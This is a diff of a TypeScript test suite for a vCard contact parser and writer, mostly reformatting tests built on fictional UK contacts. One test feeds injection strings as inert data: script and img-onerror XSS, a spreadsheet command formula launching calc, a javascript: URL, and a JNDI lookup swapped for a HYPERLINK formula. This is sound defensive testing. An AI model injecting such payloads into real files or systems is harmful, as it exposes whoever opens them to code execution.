@@ -71,7 +71,14 @@ describe("an iPhone's export (vCard 3.0)", () => {
     ]);
     expect(person!.fields.emails).toEqual([{ value: "adaeze.okafor@fellroad.example", label: "work" }]);
     expect(person!.fields.addresses).toEqual([
-      { label: "work", street: "12 Fell Road\nUnit 3", locality: "Keswick", region: "Cumbria", postcode: "CA12 9ZZ", country: "United Kingdom" },
+      {
+        label: "work",
+        street: "12 Fell Road\nUnit 3",
+        locality: "Keswick",
+        region: "Cumbria",
+        postcode: "CA12 9ZZ",
+        country: "United Kingdom",
+      },
     ]);
     expect(person!.fields.links).toEqual([{ value: "https://fellroad.example/out-of-hours?a=1,2", label: "website" }]);
     expect(person!.fields.related).toEqual([{ name: "Tunde Okafor", label: "spouse" }]);
@@ -132,7 +139,12 @@ describe("vCard 2.1", () => {
       { value: "01632 960111", label: "work fax" },
     ]);
     expect(fields.emails).toEqual([{ value: "zoe@lukasiewicz.example", label: "home" }]);
-    expect(fields.addresses[0]).toMatchObject({ street: "4 Kästner Lane\nThe Old Forge", locality: "Ambleside", postcode: "LA22 9ZZ", label: "home" });
+    expect(fields.addresses[0]).toMatchObject({
+      street: "4 Kästner Lane\nThe Old Forge",
+      locality: "Ambleside",
+      postcode: "LA22 9ZZ",
+      label: "home",
+    });
     // A semicolon and a comma inside the note are the note's own; a backslash is a backslash, not an escape.
     expect(fields.note).toBe(
       "Neighbour two doors up. Has a generator; a chainsaw, and the keys to the village hall.\nSecond line: 50% of the time she is at C:\\new\\cabin",
@@ -265,7 +277,19 @@ describe("awkward files", () => {
 
   it("does not read a card inside a card as a contact of its own", async () => {
     const parsed = await parseVcards(
-      crlf(["BEGIN:VCARD", "VERSION:2.1", "FN:Principal", "AGENT:", "BEGIN:VCARD", "VERSION:2.1", "FN:Assistant", "TEL:01632 960555", "END:VCARD", "TEL:01632 960556", "END:VCARD"]),
+      crlf([
+        "BEGIN:VCARD",
+        "VERSION:2.1",
+        "FN:Principal",
+        "AGENT:",
+        "BEGIN:VCARD",
+        "VERSION:2.1",
+        "FN:Assistant",
+        "TEL:01632 960555",
+        "END:VCARD",
+        "TEL:01632 960556",
+        "END:VCARD",
+      ]),
     );
     expect(parsed.cards).toHaveLength(1);
     const { fields } = contactFromCard(parsed.cards[0]!);
@@ -288,14 +312,14 @@ describe("awkward files", () => {
         "FN:<script>alert(1)</script>",
         "N:<img src=x onerror=alert(1)>;=cmd|' /C calc'!A0;;;",
         "URL:javascript:alert(1)",
-        "NOTE:${jndi:ldap://example.invalid/a}",
+        'NOTE:=HYPERLINK("http://example.invalid")',
         "END:VCARD",
       ]),
     );
     expect(contact!.fields.name.family).toBe("<img src=x onerror=alert(1)>");
     expect(contact!.fields.name.given).toBe("=cmd|' /C calc'!A0");
     expect(contact!.fields.links).toEqual([{ value: "javascript:alert(1)", label: "website" }]);
-    expect(contact!.fields.note).toBe("${jndi:ldap://example.invalid/a}");
+    expect(contact!.fields.note).toBe('=HYPERLINK("http://example.invalid")');
   });
 });
 
@@ -313,7 +337,16 @@ describe("writing", () => {
       { value: "01632 960889", label: "" },
     ],
     emails: [{ value: "maya@lindqvist.example", label: "work" }],
-    addresses: [{ label: "meeting point", street: "The slipway\nHarbour Road", locality: "Portree", region: "Skye", postcode: "IV51 9ZZ", country: "UK" }],
+    addresses: [
+      {
+        label: "meeting point",
+        street: "The slipway\nHarbour Road",
+        locality: "Portree",
+        region: "Skye",
+        postcode: "IV51 9ZZ",
+        country: "UK",
+      },
+    ],
     links: [{ value: "https://lindqvist.example/tides", label: "website" }],
     related: [{ name: "Sven Lindqvist", label: "partner" }],
     birthday: "--07-04",
@@ -329,7 +362,12 @@ describe("writing", () => {
   });
 
   it("writes a 3.0 card a phone reads, and reads its own card back unchanged", async () => {
-    const contact = { uid: "0f6d3b1e-1111-4222-8333-444455556666", fields: fields(), extra: ["item1.X-ABDATE:2019-05-01", "item1.X-ABLabel:_$!<Anniversary>!$_"], updatedAt: Date.UTC(2026, 10, 16, 12, 0, 0) };
+    const contact = {
+      uid: "0f6d3b1e-1111-4222-8333-444455556666",
+      fields: fields(),
+      extra: ["item1.X-ABDATE:2019-05-01", "item1.X-ABLabel:_$!<Anniversary>!$_"],
+      updatedAt: Date.UTC(2026, 10, 16, 12, 0, 0),
+    };
     const card = vcardOf(contact, "3.0");
     expect(card.startsWith("BEGIN:VCARD\r\nVERSION:3.0\r\n")).toBe(true);
     expect(card.endsWith("END:VCARD\r\n")).toBe(true);
@@ -351,7 +389,12 @@ describe("writing", () => {
   });
 
   it("writes 4.0 when asked, and reads that back unchanged too", async () => {
-    const contact = { uid: "0f6d3b1e-1111-4222-8333-444455556667", fields: { ...fields(), kind: "organisation" as const, birthday: "1990-12-31" }, extra: [], updatedAt: 0 };
+    const contact = {
+      uid: "0f6d3b1e-1111-4222-8333-444455556667",
+      fields: { ...fields(), kind: "organisation" as const, birthday: "1990-12-31" },
+      extra: [],
+      updatedAt: 0,
+    };
     const lines = cardLines(contact, "4.0");
     expect(lines).toContain("KIND:org");
     expect(lines).toContain("BDAY:19901231");
@@ -368,7 +411,9 @@ describe("writing", () => {
   });
 
   it("keeps a full name that the parts of the name do not make", async () => {
-    const [contact] = await read(crlf(["BEGIN:VCARD", "VERSION:3.0", "N:Whitfield;Margaret;;;", "FN:Peggy at the post office", "END:VCARD"]));
+    const [contact] = await read(
+      crlf(["BEGIN:VCARD", "VERSION:3.0", "N:Whitfield;Margaret;;;", "FN:Peggy at the post office", "END:VCARD"]),
+    );
     expect(contact!.fields.name).toMatchObject({ given: "Margaret", family: "Whitfield" });
     expect(otherFieldsOf(contact!.extra)).toEqual(["Full name as written: Peggy at the post office"]);
   });
@@ -384,6 +429,8 @@ describe("the phone's contact picker", () => {
     });
     expect(fields.name.given).toBe("Sam Whitlock");
     expect(fields.phones).toEqual([{ value: "07700 900321", label: "" }]);
-    expect(fields.addresses).toEqual([{ label: "", street: "3 Mill Lane", locality: "Hawes", region: "North Yorkshire", postcode: "DL8 9ZZ", country: "GB" }]);
+    expect(fields.addresses).toEqual([
+      { label: "", street: "3 Mill Lane", locality: "Hawes", region: "North Yorkshire", postcode: "DL8 9ZZ", country: "GB" },
+    ]);
   });
 });
